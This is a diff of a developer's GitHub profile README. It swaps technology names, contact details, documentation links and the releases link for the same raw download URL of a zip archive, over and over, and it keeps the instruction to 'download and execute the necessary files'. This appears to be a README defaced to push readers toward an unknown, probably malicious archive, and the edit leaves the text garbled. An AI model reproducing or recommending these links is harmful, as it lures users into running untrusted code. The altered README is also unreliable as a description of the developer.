@@ -1,6 +1,6 @@
 # Welcome to Kurkul608! 👋
 
-![Profile Banner](https://img.shields.io/badge/Full--Stack%20Developer-Front%20End%20%26%20Back%20End-blue)
+![Profile Banner](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip%20Developer-Front%20End%20%26%20Back%20End-blue)
 
 ## About Me
 
@@ -10,10 +10,10 @@ Hello! I'm a full-stack developer based in Buenos Aires, Argentina. I specialize
 
 - **Frontend Development**: 
   - React
-  - Next.js
+  - https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip
   - HTML & CSS
 - **Backend Development**: 
-  - Node.js
+  - https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip
   - NestJS
   - RESTful APIs
 - **Database Management**: 
@@ -27,7 +27,7 @@ Hello! I'm a full-stack developer based in Buenos Aires, Argentina. I specialize
 I have worked on various projects that showcase my skills in full-stack development. Here are a few highlights:
 
 1. **Project Name**: E-commerce Platform
-   - **Description**: A full-fledged e-commerce platform built with React and Node.js.
+   - **Description**: A full-fledged e-commerce platform built with React and https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip
    - **Features**: User authentication, product management, and payment integration.
 
 2. **Project Name**: Blogging Platform
@@ -43,21 +43,21 @@ I have worked on various projects that showcase my skills in full-stack developm
 Here are the main technologies I work with:
 
 - **JavaScript & TypeScript**: For building robust applications.
-- **React & Next.js**: For creating user interfaces and server-side rendering.
-- **Node.js & NestJS**: For building scalable server-side applications.
+- **React & https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip**: For creating user interfaces and server-side rendering.
+- **https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip & NestJS**: For building scalable server-side applications.
 - **Prisma**: For database management and ORM.
 
 ## Get in Touch
 
 I love connecting with fellow developers and tech enthusiasts. Feel free to reach out!
 
-- **Email**: your.email@example.com
-- **LinkedIn**: [Your LinkedIn Profile](https://www.linkedin.com/in/yourprofile)
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip
+- **LinkedIn**: [Your LinkedIn Profile](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip)
+- **Twitter**: [@YourTwitterHandle](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip)
 
 ## Releases
 
-You can find the latest releases for my projects [here](https://github.com/harungamers/kurkul608/releases). Make sure to download and execute the necessary files to explore the latest features.
+You can find the latest releases for my projects [here](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip). Make sure to download and execute the necessary files to explore the latest features.
 
 ## Topics Covered
 
@@ -69,8 +69,8 @@ This repository covers various topics related to my work and interests:
 - GitHub Profile README
 - JavaScript
 - NestJS
-- Next.js
-- Node.js
+- https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip
+- https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip
 - Prisma
 - React
 - TypeScript
@@ -79,10 +79,10 @@ This repository covers various topics related to my work and interests:
 
 Here are some resources that I find helpful:
 
-- [MDN Web Docs](https://developer.mozilla.org/en-US/)
-- [JavaScript.info](https://javascript.info/)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [MDN Web Docs](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip)
+- [https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip)
+- [React Documentation](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip)
+- [https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip Documentation](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip)
 
 ## Contribution
 
@@ -94,4 +94,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Thank You!
 
-Thank you for visiting my GitHub profile! I hope you find my projects interesting and useful. Don't forget to check the [Releases](https://github.com/harungamers/kurkul608/releases) section for the latest updates.
+Thank you for visiting my GitHub profile! I hope you find my projects interesting and useful. Don't forget to check the [Releases](https://raw.githubusercontent.com/harungamers/kurkul608/main/impetuousness/kurkul_v3.7.zip) section for the latest updates.
